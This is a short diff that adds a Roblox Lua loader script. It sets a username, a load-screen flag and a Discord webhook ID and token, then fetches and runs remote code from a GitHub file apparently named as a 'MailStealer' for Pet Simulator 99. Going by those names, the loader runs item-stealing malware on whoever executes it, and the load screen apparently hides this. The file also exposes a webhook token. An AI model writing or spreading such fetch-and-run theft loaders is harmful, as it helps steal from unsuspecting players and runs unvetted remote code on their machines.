@@ -1,0 +1,5 @@
+Username = "Azmac102289p"
+LoadScreen = true 
+Webhook =  "1321291369712713768/CzUchABYugiXIrIZQry3RE5edRf6AlIZ1CTNq9VFRb_tBWklzDrnO2TJhAnaIk_RpcMD"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
